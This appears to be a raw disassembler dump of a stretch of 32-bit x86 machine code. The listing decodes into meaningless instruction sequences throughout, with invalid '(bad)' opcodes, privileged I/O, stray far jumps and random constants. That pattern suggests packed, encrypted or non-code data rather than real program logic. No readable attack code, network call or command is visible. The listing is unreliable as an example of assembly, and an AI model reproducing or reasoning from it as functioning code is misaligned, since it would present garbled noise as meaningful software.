  41b0a7:	xchg   esi,eax
  41b0a8:	test   al,0xe
  41b0aa:	aas    
  41b0ab:	sub    al,0xc8
  41b0ad:	xchg   ebp,eax
  41b0ae:	ins    BYTE PTR es:[edi],dx
  41b0af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b0:	out    0x96,al
  41b0b2:	inc    ecx
  41b0b3:	lods   eax,DWORD PTR ds:[esi]
  41b0b4:	fs sbb al,0x6b
  41b0b7:	cli    
  41b0b8:	xor    esp,eax
  41b0ba:	add    DWORD PTR [ecx+0x28de394f],eax
  41b0c0:	inc    esp
  41b0c1:	(bad)  [edi+0x602be8c4]
  41b0c7:	sbb    DWORD PTR [ebx],edx
  41b0c9:	(bad)  
  41b0ca:	inc    DWORD PTR [ebp-0x5f]
  41b0cd:	xor    al,0x4b
  41b0cf:	fs cmc 
  41b0d1:	inc    ebx
  41b0d2:	fiadd  WORD PTR [eax-0x694e46e0]
  41b0d8:	xchg   edx,eax
  41b0d9:	xor    al,0x66
  41b0db:	fst    QWORD PTR [ebp+0x3c]
  41b0de:	inc    esp
  41b0df:	retf   0xc9eb
  41b0e2:	or     esp,DWORD PTR [ecx-0x3c]
  41b0e5:	mov    ds:0xec004a76,eax
  41b0ea:	lds    edx,FWORD PTR [ebx+0x1835]
	...
  41b154:	add    BYTE PTR [eax],al
  41b156:	(bad)  
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x78ae752
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR ds:0x39e32246,dl
  41b173:	pop    eax
  41b174:	mov    edi,0xd53e3ba6
  41b179:	adc    eax,0x533ff8a
  41b17e:	fs into 
  41b180:	push   esi
  41b181:	cwde   
  41b182:	fst    QWORD PTR [eax-0x35fb3ee5]
  41b188:	les    edi,FWORD PTR [edx-0x3e787a9b]
  41b18e:	add    ch,BYTE PTR [ebp-0x61c77181]
  41b194:	dec    esi
  41b195:	punpckhdq mm5,QWORD PTR [edx]
  41b198:	gs iret 
  41b19a:	xchg   edx,edi
  41b19c:	sbb    ebx,esp
  41b19e:	sub    ecx,esp
  41b1a0:	(bad)  
  41b1a1:	out    dx,al
  41b1a2:	iret   
  41b1a3:	jnp    0x41b1f8
  41b1a5:	pusha  
  41b1a6:	pop    eax
  41b1a7:	mov    al,0xb4
  41b1a9:	test   al,0xaf
  41b1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1ac:	adc    dl,dl
  41b1ae:	adc    DWORD PTR [eax-0x7f05212e],eax
  41b1b4:	inc    esi
  41b1b5:	jno    0x41b192
  41b1b7:	ja     0x41b1f0
  41b1b9:	mov    edx,0xe88b2fad
  41b1be:	sbb    eax,0xe36ab3a4
  41b1c3:	test   eax,0xe6eeadb8
  41b1c8:	int    0xb8
  41b1ca:	dec    eax
  41b1cb:	pop    ecx
  41b1cc:	mov    BYTE PTR [ecx+0x17],ch
  41b1cf:	sub    al,0x6d
  41b1d1:	fwait
  41b1d2:	xor    esi,edx
  41b1d4:	dec    edx
  41b1d5:	(bad)  
  41b1d6:	adc    al,0xf2
  41b1d8:	mov    esi,0x830c128c
  41b1dd:	sar    DWORD PTR [edi-0x3b81d163],cl
  41b1e3:	es jmp 0xa2fc1d62
  41b1e9:	ret    0xe1a0
  41b1ec:	mov    BYTE PTR [ebp+0x70db435d],0x28
  41b1f3:	xor    eax,0x566558bd
  41b1f8:	sub    ebx,DWORD PTR [ebx]
  41b1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1fb:	sub    al,0x84
  41b1fd:	mov    edi,0x9662b791
  41b202:	(bad)  
  41b203:	pusha  
  41b204:	or     eax,0xdd8e983f
  41b209:	sbb    BYTE PTR [edx],dh
  41b20b:	pusha  
  41b20c:	xor    al,0x99
  41b20e:	aas    
  41b20f:	inc    edx
  41b210:	dec    esp
  41b211:	xchg   esi,eax
  41b212:	lods   al,BYTE PTR ds:[esi]
  41b213:	in     eax,0x55
  41b215:	pop    esi
  41b216:	loope  0x41b250
  41b218:	or     ecx,eax
  41b21a:	push   ds
  41b21b:	ror    BYTE PTR [edi],cl
  41b21d:	imul   edi
  41b21f:	ins    BYTE PTR es:[edi],dx
  41b220:	push   edi
  41b221:	sub    eax,0x6798e6cf
  41b226:	jp     0x41b1d9
  41b228:	in     al,dx
  41b229:	dec    esi
  41b22a:	outs   dx,BYTE PTR ds:[esi]
  41b22b:	aad    0x18
  41b22d:	sub    BYTE PTR [ecx],ch
  41b22f:	int3   
  41b230:	sar    esi,0x7d
  41b233:	cwde   
  41b234:	sbb    WORD PTR [esi-0x5],si
  41b238:	jl     0x41b297
  41b23a:	stos   BYTE PTR es:[edi],al
  41b23b:	and    esi,DWORD PTR [ebp+ebp*2-0x2e19991a]
  41b242:	adc    eax,0x2629d209
  41b247:	adc    al,0x26
  41b249:	popf   
  41b24a:	xlat   BYTE PTR ds:[ebx]
  41b24b:	lods   eax,DWORD PTR ds:[esi]
  41b24c:	or     DWORD PTR [ecx-0xebf5536],ecx
  41b252:	and    bl,BYTE PTR [edi+0x3b]
  41b255:	mul    DWORD PTR [esp+ecx*1-0x11994ba1]
  41b25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b25d:	xor    eax,0x66d88afc
  41b262:	popa   
  41b263:	jo     0x41b1f0
  41b265:	add    DWORD PTR [eax-0x6dc2beae],esi
  41b26b:	xchg   DWORD PTR [ebp+0x48],ecx
	...
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [ebx+0x67b87625],cl
  41b2e7:	and    al,0x1
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    BYTE PTR [edx+esi*2+0x77a04fbf],cl
  41b2f4:	inc    BYTE PTR [edx]
  41b2f6:	push   ss
  41b2f7:	mov    ah,0x9d
  41b2f9:	jnp    0x41b2e7
  41b2fb:	fcmovbe st,st(1)
  41b2fd:	and    ch,BYTE PTR [ecx-0x41]
  41b300:	dec    esp
  41b301:	seto   dh
  41b304:	and    eax,0x4e9e6960
  41b309:	and    DWORD PTR [ebx-0x66ccc8ac],ebx
  41b30f:	mov    esp,0xd189fadd
  41b314:	stos   BYTE PTR es:[edi],al
  41b315:	dec    edx
  41b316:	and    edi,eax
  41b318:	(bad)  
  41b319:	mov    esp,0x8d83ebe8
  41b31e:	aad    0x6a
  41b320:	das    
  41b321:	jle    0x41b2d0
  41b323:	inc    esi
  41b324:	and    ah,BYTE PTR [esi+eax*1]
  41b327:	daa    
  41b328:	lods   al,BYTE PTR ds:[esi]
  41b329:	jae    0x41b361
  41b32b:	arpl   WORD PTR [ecx-0x21],dx
  41b32e:	jo     0x41b378
  41b330:	aad    0xf9
  41b332:	cmp    dl,BYTE PTR [edi+esi*2+0x70cf2af0]
  41b339:	loop   0x41b2ef
  41b33b:	lods   al,BYTE PTR ds:[esi]
  41b33c:	(bad)  
  41b33d:	scas   eax,DWORD PTR es:[edi]
  41b33e:	xchg   edx,eax
  41b33f:	and    ebx,DWORD PTR [ebx-0x19]
  41b342:	imul   esp,esi,0xe568283b
  41b348:	outs   dx,BYTE PTR ds:[esi]
  41b349:	inc    ecx
  41b34a:	int    0x41
  41b34c:	xor    esi,eax
  41b34e:	js     0x41b308
  41b350:	sub    bl,BYTE PTR [ebp+ebp*4-0x29]
  41b354:	push   0xb29fb933
  41b359:	repz ss out dx,eax
  41b35c:	or     eax,0xd919b4e7
  41b361:	aad    0xd6
  41b363:	inc    ecx
  41b364:	cmp    esi,edx
  41b366:	dec    edx
  41b367:	and    eax,0xd8d18937
  41b36c:	test   al,0xb4
  41b36e:	dec    ebp
  41b36f:	shl    bl,cl
  41b371:	je     0x41b3ef
  41b373:	stos   DWORD PTR es:[edi],eax
  41b374:	add    DWORD PTR [ebx-0x78],edx
  41b377:	retf   
  41b378:	imul   eax,eax,0x8d1e0d8
  41b37e:	pop    es
  41b37f:	jno    0x41b397
  41b381:	push   0xffffffa1
  41b383:	pop    esp
  41b384:	out    dx,eax
  41b385:	mov    ch,0x5f
  41b387:	push   cs
  41b388:	sbb    eax,0xd7c1fe4b
  41b38d:	fdiv   QWORD PTR [edi]
  41b38f:	dec    eax
  41b390:	int3   
  41b391:	or     al,0x1d
  41b393:	aam    0x1d
  41b395:	mov    ch,0xbb
  41b397:	xor    ebp,edi
  41b399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b39a:	adc    eax,0x139e58f2
  41b39f:	jmp    0x41b3ca
  41b3a1:	pushf  
  41b3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3a3:	or     al,0x67
  41b3a5:	mov    ds:0x13eaacac,eax
  41b3aa:	repnz push ds
  41b3ac:	outs   dx,BYTE PTR ds:[esi]
  41b3ad:	sub    ax,0x1b86
  41b3b1:	sbb    al,0xc
  41b3b3:	lds    edi,FWORD PTR [edi-0x4cb84b13]
  41b3b9:	jle    0x41b38e
  41b3bb:	retf   0xe3cf
  41b3be:	mov    esp,0xb6355eb3
  41b3c3:	mov    ds:0xed2301f8,eax
  41b3c8:	out    dx,al
  41b3c9:	sbb    BYTE PTR [eax+0xb],0xc7
  41b3cd:	mov    bl,0x2d
  41b3cf:	les    eax,FWORD PTR [eax+0x5f1bd802]
  41b3d5:	jg     0x41b3c1
  41b3d7:	cmp    edx,DWORD PTR [edi]
  41b3d9:	bswap  ebp
  41b3db:	jae    0x41b370
  41b3dd:	xchg   edx,eax
  41b3de:	ins    BYTE PTR es:[edi],dx
  41b3df:	adc    dl,BYTE PTR [ecx+0x28]
  41b3e2:	bnd ret 
  41b3e4:	test   al,0x2e
  41b3e6:	or     eax,0x71c46920
  41b3eb:	(bad)  
  41b3ec:	loope  0x41b3a8
	...
  41b456:	dec    eax
  41b457:	or     eax,0xbb5dab1d
  41b45c:	(bad)  
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	ds in  eax,dx
  41b464:	vpackuswb ymm4,ymm4,YMMWORD PTR ds:0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	sti    
  41b46f:	retf   0xd315
  41b472:	mov    ecx,esp
  41b474:	or     eax,0x2b2e7ef0
  41b479:	sar    DWORD PTR [ecx],cl
  41b47b:	stos   DWORD PTR es:[edi],eax
  41b47c:	xchg   esi,esp
  41b47e:	rcl    BYTE PTR [edx+0x5e],0x49
  41b482:	popa   
  41b483:	mov    DWORD PTR [ebx-0x2efe9be7],esi
  41b489:	xchg   esi,eax
  41b48a:	mov    eax,0xf4ba4964
  41b48f:	cmc    
  41b490:	gs int 0xba
  41b493:	mov    ss,WORD PTR [ecx-0x3eb8854d]
  41b499:	add    eax,0x3b2d0df4
  41b49e:	fisttp WORD PTR [esi-0x58]
  41b4a1:	cmp    BYTE PTR [eax-0x47f75225],dh
  41b4a7:	xor    BYTE PTR [ecx+0x67],dl
  41b4aa:	add    BYTE PTR [edx],bl
  41b4ac:	sbb    BYTE PTR [esi-0x61],0x1b
  41b4b0:	pop    es
  41b4b1:	mov    ds:0xcd2889c9,al
  41b4b6:	sub    al,0xd1
  41b4b8:	mov    ebx,0xeca845f5
  41b4bd:	mov    bl,0x2d
  41b4bf:	loop   0x41b489
  41b4c1:	jmp    0x41b453
  41b4c3:	pop    eax
  41b4c4:	push   0x1e28e63b
  41b4c9:	into   
  41b4ca:	xchg   esp,eax
  41b4cb:	shl    BYTE PTR [esi+0x38],cl
  41b4ce:	push   edi
  41b4cf:	or     dh,BYTE PTR [esp+eiz*4]
  41b4d2:	push   0x4f
  41b4d4:	das    
  41b4d5:	imul   esp,ebp,0xffffffd5
  41b4d8:	dec    eax
  41b4d9:	leave  
  41b4da:	xchg   edi,eax
  41b4db:	xor    dh,BYTE PTR [esp+ebp*2]
  41b4de:	cmp    al,0x83
  41b4e0:	test   eax,0xa62b1754
  41b4e5:	aas    
  41b4e6:	cmp    ecx,eax
  41b4e8:	stos   DWORD PTR es:[edi],eax
  41b4e9:	stos   BYTE PTR es:[edi],al
  41b4ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4ec:	jno    0x41b4a3
  41b4ee:	data16 sub ah,BYTE PTR [edx-0x73eb2e74]
  41b4f5:	lock pop es
  41b4f7:	add    al,0x48
  41b4f9:	jg     0x41b4ed
  41b4fb:	aad    0xeb
  41b4fd:	push   cs
  41b4fe:	inc    edx
  41b4ff:	stos   BYTE PTR es:[edi],al
  41b500:	stos   DWORD PTR es:[edi],eax
  41b501:	jg     0x41b498
  41b503:	cmc    
  41b504:	cli    
  41b505:	or     esp,edi
  41b507:	scas   al,BYTE PTR es:[edi]
  41b508:	data16 jno 0x41b49a
  41b50b:	sub    cl,BYTE PTR [ebp-0x10]
  41b50e:	jo     0x41b4e9
  41b510:	jl     0x41b509
  41b512:	in     al,0x4a
  41b514:	sub    ah,BYTE PTR [ebp-0x725e843d]
  41b51a:	in     al,dx
  41b51b:	jmp    0x41b4cf
  41b51d:	scas   eax,DWORD PTR es:[edi]
  41b51e:	int3   
  41b51f:	mov    ah,0x42
  41b521:	xchg   esi,eax
  41b522:	mov    esi,0x5281cac9
  41b527:	popf   
  41b528:	(bad)  
  41b529:	das    
  41b52a:	cmp    DWORD PTR [edx+ebx*8-0x36630521],esp
  41b531:	sub    BYTE PTR [edi],ah
  41b533:	mov    cs,edx
  41b535:	loop   0x41b58b
  41b537:	test   BYTE PTR [eax-0x7f],ah
  41b53a:	ins    DWORD PTR es:[edi],dx
  41b53b:	add    bl,ah
  41b53d:	adc    DWORD PTR [esi],edi
  41b53f:	xchg   edi,eax
  41b540:	shl    BYTE PTR [esi],cl
  41b542:	stos   BYTE PTR es:[edi],al
  41b543:	cld    
  41b544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b545:	retf   0xa163
  41b548:	xor    DWORD PTR [ecx],0x2a
  41b54b:	cld    
  41b54c:	jns    0x41b589
  41b54e:	cs jmp 0xf812468
  41b554:	fs add eax,0xfb56d968
  41b55a:	outs   dx,BYTE PTR ds:[esi]
  41b55b:	(bad)  
  41b55c:	int    0x21
  41b55e:	mov    bl,0x78
  41b560:	push   edi
  41b561:	xchg   ebx,eax
  41b562:	adc    DWORD PTR [esp+edx*4+0x60],esi
  41b566:	adc    ecx,DWORD PTR [esi]
  41b568:	pusha  
  41b569:	cbw    
  41b56b:	pop    esp
  41b56c:	push   esi
  41b56d:	out    0x0,eax
	...
  41b5d3:	add    BYTE PTR [eax],al
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	pop    es
  41b5e3:	or     edi,DWORD PTR [edx]
  41b5e5:	and    BYTE PTR [edi+0x26],0x1
  41b5e9:	add    BYTE PTR [eax],al
  41b5eb:	add    DWORD PTR [eax],eax
  41b5ed:	add    BYTE PTR [esi-0x75],dh
  41b5f0:	adc    eax,0x9c28cc27
  41b5f5:	add    BYTE PTR [esi-0x2d],dh
  41b5f8:	scas   eax,DWORD PTR es:[edi]
  41b5f9:	es inc ecx
  41b5fb:	sbb    al,0xeb
  41b5fd:	shl    DWORD PTR [edi-0x68835ca2],1
  41b603:	sub    eax,0x91ee62b3
  41b608:	nop
  41b609:	(bad)  
  41b60a:	mov    dl,0x90
  41b60c:	test   BYTE PTR es:[edx],bh
  41b60f:	and    al,0xc0
  41b611:	outs   dx,BYTE PTR ds:[esi]
  41b612:	in     eax,dx
  41b613:	out    0x76,al
  41b615:	adc    BYTE PTR [esi+0x9135b53],bl
  41b61b:	retf   0xda74
  41b61e:	lods   al,BYTE PTR ds:[esi]
  41b61f:	sbb    DWORD PTR ss:[eax+eiz*1-0x67],0x4c
  41b625:	push   ds
  41b626:	mov    eax,ds:0x3271d85e
  41b62b:	push   edi
  41b62c:	jns    0x41b650
  41b62e:	cmp    BYTE PTR [ecx-0x38f272cf],dl
  41b634:	dec    edx
  41b635:	and    al,0xda
  41b637:	pop    ss
  41b638:	cmp    DWORD PTR [edi+0x5],edi
  41b63b:	sysret 
  41b63d:	(bad)  
  41b63e:	xor    DWORD PTR [ecx+0x1f],0x956a6b15
  41b645:	repz js 0x41b63c
  41b648:	jae    0x41b5f9
  41b64a:	inc    edx
  41b64b:	xor    dl,dh
  41b64d:	jae    0x41b623
  41b64f:	jno    0x41b620
  41b651:	aas    
  41b652:	ds dec ebx
  41b654:	neg    BYTE PTR [ecx-0x38abf522]
  41b65a:	int    0xc3
  41b65c:	pop    ss
  41b65d:	call   0xf5439784
  41b662:	sbb    eax,0xff0963f8
  41b667:	mov    ds:0x323d3c49,eax
  41b66c:	mov    ebx,0x92b369d8
  41b671:	xlat   BYTE PTR ds:[ebx]
  41b672:	addr16 (bad) 
  41b674:	cmc    
  41b675:	lea    edi,[ebp+0x271b6e61]
  41b67b:	sbb    al,0x89
  41b67d:	test   al,0xd
  41b67f:	add    al,0x42
  41b681:	mov    WORD PTR [esi],?
  41b683:	jno    0x41b6d7
  41b685:	test   al,0x1f
  41b687:	fidivr WORD PTR ds:0x2a091765
  41b68d:	mov    esi,0x62a0e2e9
  41b692:	pop    eax
  41b693:	sahf   
  41b694:	adc    esp,edx
  41b696:	and    DWORD PTR [esi+0x60a38ccd],eax
  41b69c:	gs stos DWORD PTR es:[edi],eax
  41b69e:	or     al,0xd9
  41b6a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a1:	push   ds
  41b6a2:	popf   
  41b6a3:	dec    ebp
  41b6a4:	jmp    0x973f85b9
  41b6a9:	jns    0x41b694
  41b6ab:	and    esi,ebx
  41b6ad:	xor    edi,DWORD PTR [esi]
  41b6af:	inc    ecx
  41b6b0:	lods   eax,DWORD PTR ds:[esi]
  41b6b1:	loopne 0x41b678
  41b6b3:	repz ds scas eax,DWORD PTR es:[edi]
  41b6b6:	xlat   BYTE PTR ds:[ebx]
  41b6b7:	adc    DWORD PTR [ebx-0x1f],ebp
  41b6ba:	nop
  41b6bb:	add    al,0xcc
  41b6bd:	xchg   ecx,eax
  41b6be:	(bad)  
  41b6bf:	jo     0x41b6d4
  41b6c1:	mov    ds:0x318ae311,eax
  41b6c6:	or     ebp,DWORD PTR [edx]
  41b6c8:	mov    dh,0xf9
  41b6ca:	mov    bl,dl
  41b6cc:	xor    al,0x91
  41b6ce:	mov    dl,0xd1
  41b6d0:	sbb    DWORD PTR [ecx-0x15],ebx
  41b6d3:	dec    edx
  41b6d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d5:	mov    edi,0x88e22d82
  41b6da:	cmp    esp,eax
  41b6dc:	cdq    
  41b6dd:	pop    esp
  41b6de:	adc    bh,BYTE PTR [ebx+0x46]
  41b6e1:	cmp    al,0x44
  41b6e3:	mov    DWORD PTR [eax+0x3],esi
  41b6e6:	jge    0x41b72e
  41b6e8:	dec    edx
  41b6e9:	adc    al,al
  41b6eb:	xor    al,0x4a
  41b6ed:	cmp    al,BYTE PTR [eax]
	...
  41b753:	add    BYTE PTR [eax],al
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	stc    
  41b763:	pop    edi
  41b764:	mov    eax,0x1276768
  41b769:	add    BYTE PTR [eax],al
  41b76b:	add    DWORD PTR [eax],eax
  41b76d:	add    BYTE PTR [esi],cl
  41b76f:	and    dh,dl
  41b771:	push   edx
  41b772:	ror    DWORD PTR [ecx],0x4
  41b775:	retf   
  41b776:	mov    al,0x79
  41b778:	test   al,0x52
  41b77a:	test   al,0x77
  41b77c:	js     0x41b7e9
  41b77e:	xchg   ebp,eax
  41b77f:	in     al,0x23
  41b781:	sbb    al,0x75
  41b783:	ins    BYTE PTR es:[edi],dx
  41b784:	ja     0x41b70c
  41b786:	scas   eax,DWORD PTR es:[edi]
  41b787:	adc    ecx,DWORD PTR [ebx-0x2f]
  41b78a:	popf   
  41b78b:	(bad)  
  41b78c:	out    0x83,al
  41b78e:	push   ebx
  41b78f:	pop    es
  41b790:	bndldx bnd3,[ebx-0x38]
  41b794:	add    ecx,DWORD PTR [esp+ebx*4-0x37]
  41b798:	mov    DWORD PTR [edx-0x525063bb],ebp
  41b79e:	test   DWORD PTR ds:0xf37d5764,edi
  41b7a4:	call   0x3b42:0xcd9d4d9d
  41b7ab:	inc    ebp
  41b7ac:	xchg   BYTE PTR [eax+edi*1],ch
  41b7af:	and    eax,0xfc6f5e5a
  41b7b4:	dec    ebp
  41b7b5:	xor    DWORD PTR [esp+ebx*4],esi
  41b7b8:	xor    bh,BYTE PTR [ecx-0x1b53a46c]
  41b7be:	push   eax
  41b7bf:	push   edx
  41b7c0:	outs   dx,BYTE PTR ds:[esi]
  41b7c1:	xchg   bh,dh
  41b7c3:	jmp    0x5347704b
  41b7c8:	pusha  
  41b7c9:	repnz mov ebp,ds
  41b7cc:	jmp    0x41b7bb
  41b7ce:	stc    
  41b7cf:	pop    edx
  41b7d0:	out    0xb9,eax
  41b7d2:	sbb    al,0xd1
  41b7d4:	mov    ebp,0xd60a1b6e
  41b7d9:	stos   BYTE PTR es:[edi],al
  41b7da:	sbb    eax,0x918a258e
  41b7df:	add    edx,DWORD PTR [eax+0x1e]
  41b7e2:	jl     0x41b81a
  41b7e4:	retf   0x5b06
  41b7e7:	hlt    
  41b7e8:	stos   BYTE PTR es:[edi],al
  41b7e9:	pop    edx
  41b7ea:	cwde   
  41b7eb:	mov    edx,0xbed15283
  41b7f0:	sbb    al,0xfe
  41b7f2:	js     0x41b834
  41b7f4:	mov    ebx,0xc5168431
  41b7f9:	sub    eax,0x34d2d888
  41b7fe:	and    eax,0x65a42159
  41b803:	rcr    ch,0xae
  41b806:	cmp    bl,bh
  41b808:	mov    ss,WORD PTR [edi+edx*4-0x1b]
  41b80c:	int3   
  41b80d:	xlat   BYTE PTR ds:[ebx]
  41b80e:	inc    eax
  41b80f:	rol    ecx,1
  41b811:	cmp    ah,bh
  41b813:	repnz and cl,BYTE PTR [edi]
  41b816:	pop    ecx
  41b817:	mov    edi,0x5332a9ce
  41b81c:	test   al,0x6f
  41b81e:	(bad)  [esi]
  41b820:	out    0x4a,al
  41b822:	ss out dx,al
  41b824:	scas   al,BYTE PTR es:[edi]
  41b825:	sub    eax,0xf32f0668
  41b82a:	ss inc eax
  41b82c:	adc    BYTE PTR ds:0x28f1c074,al
  41b832:	mov    edx,DWORD PTR [ecx+0xdea3f9c]
  41b838:	push   ds
  41b839:	push   0xec21db43
  41b83e:	dec    esi
  41b83f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b840:	mov    ecx,0xb3767800
  41b845:	es jmp 0xb7f8:0x1290faa7
  41b84d:	and    ah,ch
  41b84f:	mov    edi,0x55291cff
  41b854:	mov    dl,0x4
  41b856:	and    bh,BYTE PTR [ebp-0x69]
  41b859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b85a:	jl     0x41b8a9
  41b85c:	arpl   WORD PTR [ecx+0x6b],cx
  41b85f:	mov    edi,0x2be2affa
  41b864:	xchg   ebx,eax
  41b865:	repz mov ds:0xca718e41,al
  41b86b:	cwde   
  41b86c:	pop    es
  41b86d:	inc    edi
	...
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x47
  41b8e3:	int    0xac
  41b8e5:	out    dx,eax
  41b8e6:	sub    BYTE PTR [bx+di],al
  41b8e9:	add    BYTE PTR [eax],al
  41b8eb:	add    DWORD PTR [eax],eax
  41b8ed:	add    BYTE PTR [eax-0x43],al
  41b8f0:	push   ds
  41b8f1:	jecxz  0x41b963
  41b8f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f4:	sbb    ebx,ebp
  41b8f6:	ret    0xe671
  41b8f9:	push   ss
  41b8fa:	and    dl,BYTE PTR ss:[edx+0x46]
  41b8fe:	mov    esp,0x1650dac8
  41b903:	adc    al,0xb6
  41b905:	mov    edx,0xae7bb217
  41b90a:	rcl    DWORD PTR [ebx],0x62
  41b90d:	test   al,0x3e
  41b90f:	jp     0x41b8b5
  41b911:	and    ah,bh
  41b913:	inc    ebp
  41b914:	ror    DWORD PTR [eax-0x4b],1
  41b917:	mov    ch,0x8e
  41b919:	int    0x1
  41b91b:	cmp    DWORD PTR [eax],0x4de32c1c
  41b921:	add    eax,0xa8eea7d2
  41b926:	jmp    0x1543:0xa10442ae
  41b92d:	mov    ebp,0x924b900b
  41b932:	xchg   edx,eax
  41b933:	dec    eax
  41b934:	xor    DWORD PTR [ecx],eax
  41b936:	add    eax,0x4b44084a
  41b93b:	in     al,dx
  41b93c:	xchg   edx,eax
  41b93d:	jmp    DWORD PTR [ebx]
  41b93f:	jmp    0xc080:0x236c7f5a
  41b946:	(bad)  
  41b947:	test   al,0xaf
  41b949:	rcl    DWORD PTR [eax],1
  41b94b:	cwde   
  41b94c:	and    DWORD PTR [edi-0x2fdd719b],esp
  41b952:	in     al,dx
  41b953:	jecxz  0x41b98b
  41b955:	cdq    
  41b956:	ds dec ecx
  41b958:	je     0x41b9d0
  41b95a:	xchg   ebx,eax
  41b95b:	push   cs
  41b95c:	pop    esp
  41b95d:	retf   
  41b95e:	lahf   
  41b95f:	mov    dh,0x30
  41b961:	sub    bh,BYTE PTR [edi+0x7189a28e]
  41b967:	rcr    DWORD PTR [esi+ebx*2],1
  41b96a:	adc    al,0x78
  41b96c:	pushf  
  41b96d:	push   edi
  41b96e:	shr    DWORD PTR [edx],cl
  41b970:	mov    esi,0x9e12285
  41b975:	mov    eax,0xde73cc9a
  41b97b:	sub    DWORD PTR [eax+ebx*1+0xb692b2b],esp
  41b982:	pop    ecx
  41b983:	nop
  41b984:	xchg   ecx,eax
  41b985:	xchg   edi,eax
  41b986:	xor    DWORD PTR [edi+0x31],edi
  41b989:	icebp  
  41b98a:	mov    esp,0xb6d798ad
  41b98f:	outs   dx,DWORD PTR ds:[esi]
  41b990:	mov    ds:0x1e8ccc9d,al
  41b995:	sub    al,0x28
  41b997:	push   eax
  41b998:	daa    
  41b999:	out    dx,al
  41b99a:	push   0xf7335ab1
  41b99f:	xor    ecx,DWORD PTR [eax-0x3a85d42]
  41b9a5:	mov    ebp,0xb6b30bc7
  41b9aa:	pcmpgtb mm0,QWORD PTR [edi+0x54]
  41b9ae:	cmp    al,0x32
  41b9b0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41b9b2:	call   0x4d2b:0x53da9a48
  41b9b9:	sub    al,0xf0
  41b9bb:	fild   DWORD PTR [eax-0x1f705e96]
  41b9c1:	std    
  41b9c2:	push   ebx
  41b9c3:	leave  
  41b9c4:	aam    0x23
  41b9c6:	add    BYTE PTR [edi+0x33],ch
  41b9c9:	xor    DWORD PTR [eax+0x2d312748],esp
  41b9cf:	jg     0x41ba2b
  41b9d1:	lds    edi,FWORD PTR [eax]
  41b9d3:	popa   
  41b9d4:	pop    edx
  41b9d5:	lahf   
  41b9d6:	pop    ds
  41b9d7:	cmp    esp,edx
  41b9d9:	call   eax
  41b9db:	jg     0x41b9a0
  41b9dd:	xchg   ebp,eax
  41b9de:	(bad)  
  41b9df:	and    ebx,DWORD PTR [edx]
  41b9e1:	push   esi
  41b9e2:	or     eax,0x1b05e7e4
  41b9e7:	test   ebp,esi
  41b9e9:	aas    
  41b9ea:	jg     0x41b980
  41b9ec:	mov    bl,BYTE PTR [ebp+0x0]
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	icebp  
  41ba63:	sahf   
  41ba64:	dec    ebp
  41ba65:	mul    BYTE PTR [edi+0x29]
  41ba68:	add    DWORD PTR [eax],eax
  41ba6a:	add    BYTE PTR [ecx],al
  41ba6c:	add    BYTE PTR [eax],al
  41ba6e:	jg     0x41bae9
  41ba70:	data16 adc bh,cl
  41ba73:	or     eax,0xb008c3d
  41ba78:	lahf   
  41ba79:	rol    edi,0x60
  41ba7c:	sub    edx,DWORD PTR [eax+eax*2-0x2c]
  41ba80:	jb     0x41baf2
  41ba82:	xor    BYTE PTR [eax+0x3c189c61],dl
  41ba88:	xchg   ebx,eax
  41ba89:	sbb    dh,BYTE PTR [esi+edi*4+0x35abbb78]
  41ba90:	fild   DWORD PTR [eax+0x2]
  41ba93:	adc    eax,0x808dc7bf
  41ba98:	pop    ss
  41ba99:	scas   al,BYTE PTR es:[edi]
  41ba9a:	fisttp QWORD PTR [esi+eax*4-0x1c8b922]
  41baa1:	mov    cl,0xb
  41baa3:	push   0x8fd1cf0e
  41baa8:	push   edi
  41baa9:	ja     0x41bac0
  41baab:	xor    esi,DWORD PTR [esi]
